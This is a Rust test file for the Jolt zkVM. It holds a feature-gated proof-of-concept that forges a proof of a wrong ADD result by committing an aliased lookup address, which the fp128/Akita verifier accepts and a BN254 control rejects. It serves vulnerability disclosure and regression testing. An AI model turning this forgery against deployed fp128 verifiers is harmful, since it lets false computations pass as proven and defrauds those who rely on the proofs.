//! End-to-end exploit for the fp128 lookup-address alias soundness break, plus
//! the BN254 control that pins the field as the cause.
//!
//! Compiled only under `fp128-forgery-poc`, which no default, release, or CI
//! configuration enables. Both halves prove and verify the same guest
//! (`alias-forgery-guest`) on the same inputs, twice — once honestly, once with
//! an aliased one-hot lookup address committed for a single `ADD` cycle:
//!
//! ```text
//! # the break: fp128 / Akita ACCEPTS the forged proof
//! cargo nextest run -p jolt-prover-legacy \
//!   --features host,akita,fp128-forgery-poc -E 'test(fp128_alias)' --no-capture
//!
//! # the control: BN254 / Dory REJECTS the identical forgery
//! cargo nextest run -p jolt-prover-legacy \
//!   --features host,fp128-forgery-poc -E 'test(fp128_alias)' --no-capture
//! ```
//!
//! # What is forged
//!
//! Jolt's instruction-lookup address `k` ranges over `[0, 2^LOG_K) = [0, 2^128)`,
//! but the only constraint tying `k` to the instruction's arithmetic is the
//! read-address (RAF) leg `Σ_k ra(k)·Identity(k) = RightLookupOperand`, and
//! `Identity(k) = k mod p`. Over the Akita fp128 field
//! `p = 2^128 - 2^32 + 22537 < 2^128`, so every `k < 2^128 - p` has a second
//! preimage `k + p` that is still a committable 128-bit address.
//!
//! # Why the aliased trace passes every fp128 check
//!
//! | Check | Why it still holds |
//! |---|---|
//! | one-hot booleanity / Hamming weight | `s + p` is an ordinary 128-bit address; every chunk is a valid lane |
//! | read-address (RAF) leg | pins only `Σ_k ra(k)·Identity(k)`, and `Identity(s + p) = Identity(s)` in `F_p` |
//! | R1CS `RightLookupOperand == x + y` | `to_lookup_operands` is left honest; only the *address* moves |
//! | read leg / `RdWrite == LookupOutput` | the table MLE reads the low `XLEN` address bits, and the forged trace writes exactly that to `rd` |
//! | register + RAM checking | the emulator override makes the whole trace consistent with the corrupted `rd` |
//!
//! Nothing constrains the committed address to be the *canonical* representative
//! of its residue class, and over fp128 there are `2^128 - p = 4_294_944_759`
//! addresses with a second representative. Over BN254 there are none, which is
//! exactly what the control half measures.
//!
//! See `AKITA_FP128_LOOKUP_ADDRESS_SOUNDNESS.md`, and
//! `tracer::instruction::fp128_forgery` for the malicious-prover hook.

use tracer::instruction::fp128_forgery;

/// Whole program: `settle(debit, credit) -> debit.wrapping_add(credit)`.
const GUEST: &str = "alias-forgery-guest";

/// Guest inputs: the operand pair the hook forges. Their sum lies inside the
/// alias window, and both are below `RAM_START_ADDRESS`, so the pair cannot
/// collide with pointer arithmetic elsewhere in the trace.
const DEBIT: u64 = fp128_forgery::TARGET_LHS;
const CREDIT: u64 = fp128_forgery::TARGET_RHS;

struct Run {
    /// The guest's return value, decoded from the public I/O the proof binds.
    output: u64,
    accepted: bool,
    /// Cycles the hook corrupted *in the proved trace*; `0` unless armed.
    forged_cycles: usize,
    /// Verifier error, when the proof was rejected.
    error: Option<String>,
}

/// Decodes the guest's return value the way `#[jolt::provable]`'s verifier
/// wrapper does.
fn decode_output(io_device: &common::jolt_device::JoltDevice) -> u64 {
    let mut outputs = io_device.outputs.clone();
    outputs.resize(io_device.memory_layout.max_output_size as usize, 0);
    postcard::take_from_bytes::<u64>(&outputs).unwrap().0
}

/// Shared assertions over an (honest, forged) pair. `expect_accepted` is the
/// only thing that differs between the two fields.
fn assert_forgery_outcome(honest: &Run, forged: &Run, expect_accepted: bool) {
    let honest_sum = DEBIT.wrapping_add(CREDIT);
    let forged_sum = fp128_forgery::forged_output(DEBIT, CREDIT);

    // The baseline must be a genuine honest run: hook never fired, correct sum.
    assert_eq!(
        honest.forged_cycles, 0,
        "the baseline run must not have forged anything"
    );
    assert!(
        honest.accepted,
        "sanity: the honest proof must verify (error: {:?})",
        honest.error
    );
    assert_eq!(
        honest.output, honest_sum,
        "sanity: the honest run computes debit + credit"
    );

    // The forged run must really have been forged, on exactly one cycle, and not
    // silently fall back to honest execution (e.g. if the ADD were optimized
    // away or the operand pair never appeared).
    assert_eq!(
        forged.forged_cycles, 1,
        "the forgery must hit exactly one cycle of the proved trace"
    );
    assert_eq!(
        forged.output, forged_sum,
        "the forged trace's output must be exactly the aliased table entry"
    );
    assert_eq!(
        honest.output.wrapping_sub(forged.output),
        fp128_forgery::ALIAS_WINDOW as u64,
        "the corruption is exactly a subtraction of 2^128 - p"
    );

    if expect_accepted {
        assert!(
            forged.accepted,
            "SOUNDNESS BREAK: the verifier accepted a proof whose ADD returned \
             x + y - (2^128 - p) instead of x + y"
        );
    } else {
        assert!(
            !forged.accepted,
            "the aliased address must be rejected when p > 2^LOG_K"
        );
    }
}

fn report(label: &str, honest: &Run, forged: &Run) {
    eprintln!("\n  fp128 lookup-address alias — end-to-end forgery [{label}]");
    eprintln!("  --------------------------------------------------------");
    eprintln!("  guest                  : {GUEST}  (settle(debit, credit) -> debit + credit)");
    eprintln!("  inputs                 : debit={DEBIT}, credit={CREDIT}");
    eprintln!("  alias window (2^128-p) : {}", fp128_forgery::ALIAS_WINDOW);
    eprintln!(
        "  honest : output={} accepted={} forged_cycles={}",
        honest.output, honest.accepted, honest.forged_cycles
    );
    eprintln!(
        "  forged : output={} accepted={} forged_cycles={}",
        forged.output, forged.accepted, forged.forged_cycles
    );
    if let Some(err) = &forged.error {
        eprintln!("  forged rejected with   : {err}");
    }
    eprintln!();
}

/// The break is a property of the *field*, not of the one-hot encoding, the
/// packed batching, or the fused opening: the alias window is
/// `max(0, 2^LOG_K - p)`, nonempty for fp128 and empty for BN254. This is the
/// one-line check a narrow-field backend must clear.
#[test]
fn fp128_alias_window_is_a_field_property() {
    use crate::zkvm::instruction_lookups::LOG_K;

    /// `p = 2^128 - 2^32 + 22537`, the Akita fp128 modulus.
    const P: u128 = (u128::MAX - (1u128 << 32)) + 22537 + 1;

    assert_eq!(LOG_K, 128, "the address domain is 2^LOG_K = 2^128");

    // The requirement is on the modulus VALUE, not its bit length: p is exactly
    // 128 bits (it lies in [2^127, 2^128)) yet is still below 2^LOG_K. So
    // "128-bit field, 128-bit address domain" is precisely the broken case.
    let fp128_aliases = 0u128.wrapping_sub(P); // == 2^128 - p, since p > 2^127
    assert_eq!(fp128_aliases, fp128_forgery::ALIAS_WINDOW);
    assert!(
        fp128_aliases > 0,
        "fp128 violates p >= 2^LOG_K, so Identity is not injective on the committed domain"
    );

    // A modulus of n bits is >= 2^(n-1), so `n > LOG_K` implies `p >= 2^LOG_K`
    // and an empty alias window. Read off the real BN254 modulus rather than
    // hardcoding 254, so the control's premise is checked and not asserted.
    use ark_ff::{BigInteger, PrimeField};
    let bn254_modulus_bits = <ark_bn254::Fr as PrimeField>::MODULUS.num_bits() as usize;
    assert!(
        bn254_modulus_bits > LOG_K,
        "BN254 has a {bn254_modulus_bits}-bit modulus, so Identity IS injective on [0, 2^{LOG_K})"
    );
}

/// The break: over fp128 the aliased proof is accepted.
#[cfg(feature = "akita")]
mod akita_path {
    use super::*;
    use crate::host;
    use crate::poly::commitment::dory::DoryGlobals;
    use crate::zkvm::packed::{
        akita_verifier_preprocessing, AkitaField, AkitaPackedProver, AkitaPackedScheme,
        AkitaScheme, AkitaTranscript, AkitaVc,
    };
    use crate::zkvm::preprocessing::JoltSharedPreprocessing;
    use crate::zkvm::program::ProgramPreprocessing;
    use crate::zkvm::prover::JoltProverPreprocessing;
    use jolt_openings::CommitmentScheme as VerifierCommitmentScheme;
    use serial_test::serial;

    fn prove_and_verify(forge: bool) -> Run {
        fp128_forgery::reset_counter();
        if forge {
            fp128_forgery::arm();
        } else {
            fp128_forgery::disarm();
        }

        DoryGlobals::reset();
        let mut program = host::Program::new(GUEST);
        let (bytecode, init_memory_state, _, e_entry) = program.decode();
        let inputs = postcard::to_stdvec(&(DEBIT, CREDIT)).unwrap();
        let (_, _, _, traced_io) = program.trace(&inputs, &[], &[]);

        let program_data =
            ProgramPreprocessing::preprocess(bytecode, init_memory_state, e_entry).unwrap();
        let shared: JoltSharedPreprocessing<AkitaPackedScheme> =
            JoltSharedPreprocessing::new(program_data, traced_io.memory_layout.clone(), 1 << 16);
        let prover_preprocessing = JoltProverPreprocessing::new(shared);
        let elf_contents_opt = program.get_elf_contents();
        let elf_contents = elf_contents_opt.as_deref().expect("elf contents is None");

        // Count only the trace the proof is built from — `program.trace` above
        // executes the same cycle once for the memory-layout probe.
        fp128_forgery::reset_counter();
        let prover = AkitaPackedProver::gen_from_elf(
            &prover_preprocessing,
            elf_contents,
            &inputs,
            &[],
            &[],
            None,
            None,
            None,
        );
        let forged_cycles = fp128_forgery::forged_cycles();

        let io_device = prover.program_io.clone();
        let (object_setup, verifier_setup) =
            <AkitaScheme as VerifierCommitmentScheme>::setup(prover.one_hot_trace_setup_params())
                .unwrap();
        let proof = prover
            .prove_packed(&object_setup, None, None)
            .expect("the forged witness must still be provable — that is the point");

        let verifier_preprocessing =
            akita_verifier_preprocessing(&prover_preprocessing, verifier_setup, None);
        let result = jolt_verifier::verify::<AkitaField, AkitaScheme, AkitaVc, AkitaTranscript>(
            &verifier_preprocessing,
            &io_device,
            &proof,
            None,
        );

        let output = decode_output(&io_device);
        fp128_forgery::disarm();
        Run {
            output,
            accepted: result.is_ok(),
            forged_cycles,
            error: result.err().map(|e| format!("{e:?}")),
        }
    }

    #[test]
    #[serial]
    fn fp128_alias_forgery_accepts_a_wrong_add() {
        let honest = prove_and_verify(false);
        let forged = prove_and_verify(true);
        report("fp128 / Akita", &honest, &forged);
        assert_forgery_outcome(&honest, &forged, true);
    }
}

/// The control: over BN254 the identical forgery is rejected, because
/// `s + p_fp128` is a genuinely different field element there, so the RAF leg no
/// longer matches `RightLookupOperand`. Same guest, same hook, same corrupted
/// trace — only the field differs.
#[cfg(not(feature = "akita"))]
mod dory_path {
    use super::*;
    use crate::host;
    use crate::poly::commitment::dory::DoryGlobals;
    use crate::zkvm::preprocessing::JoltSharedPreprocessing;
    use crate::zkvm::program::ProgramPreprocessing;
    use crate::zkvm::proof::verifier_preprocessing_from_prover;
    use crate::zkvm::prover::JoltProverPreprocessing;
    use crate::zkvm::RV64IMACProver;
    use serial_test::serial;

    fn prove_and_verify(forge: bool) -> Run {
        fp128_forgery::reset_counter();
        if forge {
            fp128_forgery::arm();
        } else {
            fp128_forgery::disarm();
        }

        DoryGlobals::reset();
        let mut program = host::Program::new(GUEST);
        let (bytecode, init_memory_state, _, e_entry) = program.decode();
        let inputs = postcard::to_stdvec(&(DEBIT, CREDIT)).unwrap();
        let (_, _, _, traced_io) = program.trace(&inputs, &[], &[]);

        let program_data =
            ProgramPreprocessing::preprocess(bytecode, init_memory_state, e_entry).unwrap();
        let shared =
            JoltSharedPreprocessing::new(program_data, traced_io.memory_layout.clone(), 1 << 16);
        let prover_preprocessing = JoltProverPreprocessing::new(shared);
        let elf_contents_opt = program.get_elf_contents();
        let elf_contents = elf_contents_opt.as_deref().expect("elf contents is None");

        fp128_forgery::reset_counter();
        let prover = RV64IMACProver::gen_from_elf(
            &prover_preprocessing,
            elf_contents,
            &inputs,
            &[],
            &[],
            None,
            None,
            None,
        );
        let forged_cycles = fp128_forgery::forged_cycles();

        let io_device = prover.program_io.clone();
        let (proof, _debug_info) = prover
            .prove()
            .expect("the forged witness must still be provable");

        let verifier_preprocessing = verifier_preprocessing_from_prover(&prover_preprocessing);
        let result = jolt_verifier::verify::<
            jolt_field::Fr,
            jolt_dory::DoryScheme,
            jolt_crypto::Pedersen<jolt_crypto::Bn254G1>,
            jolt_transcript::LegacyBlake2bTranscript<jolt_field::Fr>,
        >(&verifier_preprocessing, &io_device, &proof, None);

        let output = decode_output(&io_device);
        fp128_forgery::disarm();
        Run {
            output,
            accepted: result.is_ok(),
            forged_cycles,
            error: result.err().map(|e| format!("{e:?}")),
        }
    }

    #[test]
    #[serial]
    fn fp128_alias_forgery_is_rejected_over_bn254() {
        let honest = prove_and_verify(false);
        let forged = prove_and_verify(true);
        report("BN254 / Dory (control)", &honest, &forged);
        assert_forgery_outcome(&honest, &forged, false);
    }
}
